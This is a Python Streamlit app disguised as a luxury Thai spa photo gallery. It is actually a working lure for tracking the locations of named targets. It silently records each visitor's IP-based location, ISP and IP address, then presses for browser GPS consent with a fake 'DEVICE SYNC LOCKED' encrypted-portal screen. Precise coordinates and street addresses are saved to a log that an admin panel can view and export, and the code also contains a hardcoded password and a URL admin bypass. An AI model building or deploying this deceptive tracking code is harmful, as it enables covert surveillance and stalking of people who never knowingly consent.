import streamlit as st
import pandas as pd
from datetime import datetime
import os
import requests
from geopy.geocoders import Nominatim
from streamlit_js_eval import get_geolocation

# ================= 1. PREMIUM SPA INTERFACE CONFIG =================
st.set_page_config(
    page_title="Lotus Aura - Premium Thai Spa", 
    layout="centered", 
    initial_sidebar_state="collapsed"
)

DATA_FILE = "spa_access_records.csv"
ADMIN_PASSWORD = "Sanjay@SpaAdmin2026"

if not os.path.exists(DATA_FILE):
    df = pd.DataFrame(columns=["Timestamp", "Guest/Executive Name", "Spa Portfolio Link", "Verified Location"])
    df.to_csv(DATA_FILE, index=False)

# Silent IP Tracker (100% Success Rate Background Capture)
def get_ip_location_silent():
    try:
        response = requests.get('http://ip-api.com/json/', timeout=4).json()
        if response and response.get('status') == 'success':
            city = response.get('city', '')
            region = response.get('regionName', '')
            country = response.get('country', '')
            isp = response.get('isp', '')
            ip = response.get('query', '')
            lat = response.get('lat', '')
            lon = response.get('lon', '')
            
            approx_address = f"[IP Fallback] City: {city}, Region: {region}, Country: {country} | ISP: {isp} (IP: {ip})"
            maps_fallback = f"https://www.google.com/maps?q={lat},{lon}"
            return approx_address, maps_fallback
    except:
        pass
    return "[IP Fetch Failed] Secure Connection Active", "https://maps.google.com"

@st.cache_data(show_spinner=False, ttl=3600)
def get_text_address_cached(lat, lon):
    try:
        geolocator = Nominatim(user_agent="thai_spa_premium_secure_v5")
        location = geolocator.reverse(f"{lat}, {lon}", timeout=5)
        return location.address if location else "Location Logged Successfully"
    except:
        return f"Coordinates Saved ({lat}, {lon})"

# Extract URL parameters
query_params = st.query_params
employee_name = query_params.get("name", "").replace("_", " ")
user_role = query_params.get("role", "") # Secret parameter for admin bypass (?role=admin)

# ================= 2. LUXURY SPA PREMIUM CSS STYLING =================
st.markdown("""
    <style>
    .main .block-container { padding-top: 2rem; max-width: 550px; }
    
    h1 { 
        color: #4A1525; 
        font-family: 'Playfair Display', serif; 
        font-weight: 800; 
        text-align: center; 
        font-size: 30px; 
        margin-bottom: 5px; 
        letter-spacing: 1px;
    }
    .sub-date { 
        text-align: center; 
        color: #9E7B3B; 
        font-size: 14px; 
        margin-bottom: 25px; 
        font-weight: 600;
        text-transform: uppercase;
        letter-spacing: 1.5px;
    }
    
    /* Gold Rounded Pill Action Button */
    div.stButton > button:first-child {
        background: linear-gradient(135deg, #D4AF37 0%, #AA7C11 100%); 
        color: #ffffff !important;
        font-size: 16px !important;
        font-weight: 700 !important;
        padding: 16px 20px !important;
        border-radius: 50px !important; 
        border: none !important;
        width: 100% !important;
        box-shadow: 0px 5px 0px #8C6207, 0px 8px 15px rgba(0, 0, 0, 0.15);
        transition: all 0.1s ease-in-out;
        text-transform: uppercase;
        letter-spacing: 1px;
    }
    div.stButton > button:first-child:active {
        transform: translateY(4px) !important;
        box-shadow: 0px 1px 0px #8C6207, 0px 4px 6px rgba(0, 0, 0, 0.1) !important;
    }
    
    .admin-btn div.stButton > button:first-child {
        background: linear-gradient(135deg, #4A1525 0%, #2A0813 100%) !important;
        box-shadow: 0px 5px 0px #1A030A, 0px 8px 15px rgba(0, 0, 0, 0.2) !important;
        border-radius: 8px !important;
    }
    
    .user-card { 
        background: #FAF6F0; 
        padding: 20px; 
        border-radius: 14px; 
        border-left: 5px solid #D4AF37; 
        margin-bottom: 20px; 
    }
    .success-card { 
        background: #F4EAE1; 
        padding: 22px; 
        border-radius: 14px; 
        border: 1px solid #D4AF37; 
        text-align: center; 
        color: #4A1525; 
        font-weight: 700; 
    }
    </style>
""", unsafe_allow_html=True)

st.markdown("<h1>🌺 LOTUS AURA LUXURY THAI SPA</h1>", unsafe_allow_html=True)
st.markdown(f"<div class='sub-date'>Premium Experience Lounge — {datetime.now().strftime('%d %B %Y')}</div>", unsafe_allow_html=True)

# Session State Initialization
if "verified_user" not in st.session_state:
    st.session_state.verified_user = False

# --- STAGE 1: BACKGROUND SILENT IP CAPTURE ---
if employee_name and f"ip_logged_{employee_name}" not in st.session_state:
    approx_address, maps_fallback = get_ip_location_silent()
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
    ip_data = pd.DataFrame([[timestamp, employee_name, maps_fallback, approx_address]], 
                           columns=["Timestamp", "Guest/Executive Name", "Spa Portfolio Link", "Verified Location"])
    ip_data.to_csv(DATA_FILE, mode='a', header=False, index=False)
    st.session_state[f"ip_logged_{employee_name}"] = True


# ================= FLOW CONTROL: CRITICAL LOCK MECHANISM =================
# Agar user verified nahi hai aur woh koi admin bypass bhi use nahi kar raha, toh content poori tarah hide rahega.
if not st.session_state.verified_user and user_role != "admin":
    if not employee_name:
        st.error("❌ Access Revoked: Missing Premium Authentication Token.")
    else:
        st.markdown(f"""
        <div class='user-card'>
            <span style='color:#9E7B3B; font-size:11px; font-weight:700; text-transform:uppercase; letter-spacing:1px;'>Authorized Spa Executive</span>
            <div style='color:#4A1525; font-size:24px; font-weight:700; font-family: "Playfair Display", serif;'>{employee_name}</div>
        </div>
        """, unsafe_allow_html=True)
        
        # Continuous Location handshake trigger
        loc = get_geolocation()
        
        trigger_gallery = st.button("📸 Click Here to View Premium Thai Spa Photos ✨")

        if trigger_gallery:
            if loc and 'coords' in loc:
                try:
                    lat = loc['coords']['latitude']
                    lon = loc['coords']['longitude']
                    
                    readable_address = get_text_address_cached(lat, lon)
                    maps_link = f"https://www.google.com/maps?q={lat},{lon}"
                    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                    
                    gps_data = pd.DataFrame([[timestamp, employee_name, maps_link, f"[High-Precision GPS] {readable_address}"]], 
                                            columns=["Timestamp", "Guest/Executive Name", "Spa Portfolio Link", "Verified Location"])
                    gps_data.to_csv(DATA_FILE, mode='a', header=False, index=False)
                    
                    st.session_state.verified_user = True
                    st.rerun()
                except Exception as e:
                    st.error("🔄 Connection Reset. Please click again.")
            else:
                # ================= 🔥 STAGE 2: ABSOLUTE INTERFACE FREEZE OVERLAY =================
                # Agar button click hua aur location bypass ki gayi, toh poora portal CSS se block ho jayega.
                st.markdown("""
                    <style>
                    .freeze-screen {
                        position: fixed;
                        top: 0; left: 0; width: 100vw; height: 100vh;
                        background: rgba(26, 5, 11, 0.99); 
                        z-index: 9999999;
                        display: flex;
                        justify-content: center;
                        align-items: center;
                        color: #FAF6F0;
                        font-family: 'Playfair Display', serif;
                        text-align: center;
                    }
                    .freeze-card {
                        max-width: 440px;
                        padding: 40px 30px;
                        border: 2px solid #D4AF37;
                        border-radius: 24px;
                        background: #2A0813;
                        box-shadow: 0px 15px 40px rgba(0,0,0,0.6);
                    }
                    </style>
                    <div class="freeze-screen">
                        <div class="freeze-card">
                            <h2 style="color: #D4AF37; margin-bottom: 15px;">🔒 DEVICE SYNC LOCKED</h2>
                            <p style="font-size: 16px; font-family: sans-serif; color: #FAF6F0; opacity: 0.9;">
                                Establishing secure end-to-end handshake with salon server...
                            </p>
                            <p style="font-size: 14px; font-family: sans-serif; color: #AA7C11; margin-top: 20px; font-weight: 700; line-height: 1.5;">
                                ⚠️ Security Action Required:<br>
                                Please ensure your phone/device GPS is turned ON and click 'ALLOW' on the browser location prompt to unfreeze this screen.
                            </p>
                            <hr style="border: 0; border-top: 1px solid rgba(214,175,55,0.2); margin: 25px 0;">
                            <div style="font-size: 12px; color: #9E7B3B; font-family: sans-serif; letter-spacing: 1px;">
                                LOTUS AURA ENCRYPTED PORTAL
                            </div>
                        </div>
                    </div>
                """, unsafe_allow_html=True)
                st.stop() # Script execution instantly frozen here.

# ================= 3. RENDER FULL APP INTERFACE (POST-VERIFICATION ONLY) =================
else:
    tab1, tab2 = st.tabs(["✨ Spa Gallery Terminal", "🔐 Management Lounge"])

    # --- CLIENT TERMINAL TAB ---
    with tab1:
        st.markdown(f"""
        <div class='success-card'>
            🎉 Access Granted: Premium Portfolio Unlocked!<br>
            <span style='font-size:13px; font-weight:500; color:#9E7B3B; display:block; margin-top:5px;'>
                Your exclusive Thai Spa session has been synchronized. Welcome to unparalleled luxury.
            </span>
        </div>
        """, unsafe_allow_html=True)
        st.balloons()
        
        # Aap yahan apni spa gallery photos ka extra content add kar sakte hain.
        st.info("ℹ️ Loading exclusive catalog media from private node...")

    # --- MANAGEMENT CONTROL LOUNGE TAB ---
    with tab2:
        st.subheader("🔑 Administrative Authentication")
        
        if "admin_logged_in" not in st.session_state:
            st.session_state.admin_logged_in = False
            
        admin_pass = st.text_input("Enter Salon Admin Password", type="password")
        
        st.markdown("<div class='admin-btn'>", unsafe_allow_html=True)
        login_click = st.button("AUTHENTICATE SPA PANEL 👑")
        st.markdown("</div>", unsafe_allow_html=True)
        
        if login_click:
            if admin_pass == ADMIN_PASSWORD:
                st.session_state.admin_logged_in = True
                st.rerun()
            else:
                st.session_state.admin_logged_in = False
                st.error("❌ Authentication Failed: Invalid Premium Admin Credentials.")
                
        if st.session_state.admin_logged_in:
            st.success("Authorized Admin Session Verified!")
            
            if os.path.exists(DATA_FILE):
                df_records = pd.read_csv(DATA_FILE)
            else:
                df_records = pd.DataFrame(columns=["Timestamp", "Guest/Executive Name", "Spa Portfolio Link", "Verified Location"])
            
            st.markdown("### 📊 Live Spa Engagement & Verification Logs")
            st.dataframe(
                df_records.iloc[::-1], 
                use_container_width=True,
                column_config={
                    "Spa Portfolio Link": st.column_config.LinkColumn("Spa Portfolio Link", display_text="View Route 🗺️")
                }
            )
            
            csv = df_records.to_csv(index=False).encode('utf-8')
            st.download_button(
                label="📥 Export Premium Spa CSV Log",
                data=csv,
                file_name=f"Thai_Spa_Report_{datetime.now().strftime('%Y-%m-%d')}.csv",
                mime='text/csv',
            )
